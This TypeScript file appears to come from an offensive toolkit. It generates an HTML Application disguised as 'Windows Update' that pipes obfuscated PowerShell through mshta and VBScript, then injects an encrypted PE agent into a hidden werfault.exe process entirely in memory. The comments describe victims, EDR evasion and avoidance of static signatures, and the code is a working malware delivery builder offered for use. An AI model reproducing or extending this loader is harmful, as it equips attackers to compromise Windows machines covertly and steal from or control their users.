/**
 * hta-wrapper.ts — Wraps a compiled PE binary in an HTML Application (.hta)
 * that injects the agent into werfault.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * LOLBAS delivery: mshta.exe (T1218.005) — signed MS binary that natively
 * executes .hta files. Double-click or `mshta.exe payload.hta` both work.
 *
 * Execution chain on victim:
 *   1. mshta.exe opens the .hta file (native Windows association)
 *   2. VBScript uses WScript.Shell.Exec to pipe PS script via stdin
 *   3. PowerShell decrypts XOR+gzip payload from piped base64 in memory
 *   4. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   5. werfault.exe started hidden (LOTL — Windows Error Reporting, low EDR coverage)
 *   6. PE manually mapped into werfault via VirtualAllocEx + WriteProcessMemory
 *   7. Relocations + imports resolved remotely
 *   8. CreateRemoteThread at PE entry point
 *   9. HTA window self-closes, agent runs inside werfault.exe — no files on disk
 */

import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Generate a self-contained .hta file with fileless PE injection.
 * Uses stdin piping to avoid the 32K Windows environment variable limit.
 * Returns the full HTA content as a string.
 */
export function wrapPeAsHta(peBytes: Buffer): string {
  const encrypted = encryptPayload(peBytes);
  const b64Payload = encrypted.toString("base64");
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

  // Build PS injection chain — reads payload + C# from variables set inline
  const chain = buildPsInjectionChain("$d", "$cs", className, "werfault.exe");

  // Escape chain for VBScript double-quoted strings: " → ""
  const chainVbs = chain.replace(/"/g, '""');

  // Split base64 into chunks for multiple VBS StdIn.Write calls
  const chunkSize = 800;
  const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
  const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];

  // Prefix with letter to ensure valid VBScript identifiers
  const rnd = "v" + randHex(5);

  // Build VBScript that pipes the full PS script via stdin (no env var size limits)
  const vbLines: string[] = [];
  vbLines.push(`Dim ${rnd}s : Set ${rnd}s = CreateObject("WScript.Shell")`);

  // Reassemble "powershell" from char codes to avoid static signatures
  vbLines.push(`Dim ${rnd}p`);
  vbLines.push(`${rnd}p = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)`);

  // Exec gives us StdIn access (unlike Run); "-" tells PS to read from stdin
  vbLines.push(`Dim ${rnd}x : Set ${rnd}x = ${rnd}s.Exec(${rnd}p & " -nop -w h -ep b -")`);

  // Pipe PS script to stdin in chunks — payload decode
  vbLines.push(`${rnd}x.StdIn.Write "$d=[Convert]::FromBase64String('"`);
  for (const chunk of payloadChunks) {
    vbLines.push(`${rnd}x.StdIn.Write "${chunk}"`);
  }
  vbLines.push(`${rnd}x.StdIn.Write "');"`);

  // Pipe C# source decode
  vbLines.push(`${rnd}x.StdIn.Write "$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"`);
  for (const chunk of csChunks) {
    vbLines.push(`${rnd}x.StdIn.Write "${chunk}"`);
  }
  vbLines.push(`${rnd}x.StdIn.Write "'));"`);

  // Pipe injection chain (quotes escaped for VBS)
  vbLines.push(`${rnd}x.StdIn.Write "${chainVbs}"`);
  vbLines.push(`${rnd}x.StdIn.Close`);

  // Self-close HTA
  vbLines.push(`self.close`);

  const vbScript = vbLines.join("\n");

  return `<html>
<head>
<title>Windows Update</title>
<HTA:APPLICATION
  ID="oHTA"
  APPLICATIONNAME="Windows Update"
  BORDER="none"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">
${vbScript}
</script>
</body>
</html>
`;
}
